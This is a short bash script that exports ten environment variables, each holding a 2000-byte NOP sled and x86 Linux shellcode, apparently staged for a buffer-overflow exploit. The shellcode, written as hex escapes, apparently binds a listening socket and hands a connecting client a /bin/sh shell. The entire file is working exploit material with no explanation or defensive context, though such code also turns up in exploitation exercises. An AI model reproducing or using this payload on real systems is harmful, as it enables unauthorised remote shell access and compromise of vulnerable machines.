#!/bin/bash
for i in {1..10}
do
    export SHELL$i=`python -c 'print "\x90"*2000 + "\x66\xbd\x2b\x67\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\x6a\x04\x54\x57\x53\x56\x89\xe1\xb3\x0e\xcd\x80\xb0\x66\x89\xfb\x52\x66\x55\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\x43\x89\x54\x24\x08\xcd\x80\x93\x89\xf9\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xa8"'`
done